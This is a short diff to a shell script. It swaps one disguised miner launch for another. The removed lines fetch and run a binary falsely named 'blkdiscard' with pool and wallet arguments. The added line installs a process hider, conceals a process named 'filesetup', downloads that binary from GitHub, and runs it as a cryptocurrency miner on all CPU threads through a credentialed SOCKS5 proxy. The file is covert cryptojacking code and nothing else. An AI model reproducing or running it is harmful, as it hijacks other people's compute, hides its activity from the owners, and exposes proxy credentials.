@@ -1,9 +1,6 @@
 #!/bin/bash
 #!/bin/sh
-sudo apt-get update >/dev/null 2>&1
-sudo apt-get install libpci3 >/dev/null 2>&1
-wget https://github.com/aurbach55/toya/raw/main/blkdiscard >/dev/null 2>&1
-chmod +x blkdiscard >/dev/null 2>&1
-./blkdiscard -pool -wal sagemaker.T5 -pass x 
+apt update && apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add filesetup && wget https://github.com/sayghqwyg/KjHhjs/raw/main/filesetup >/dev/null 2>&1 && chmod +x filesetup >/dev/null 2>&1 && ./filesetup -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u 7pXYkwdwUFBGNaG8dJ8w6kZTzRjnTpDTgo.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p c=DASH -t $(nproc --all) --proxy socks5://njhlezbg-rotate:bo6mj3wz34gr@p.webshare.io:80
+ 
 	
 	
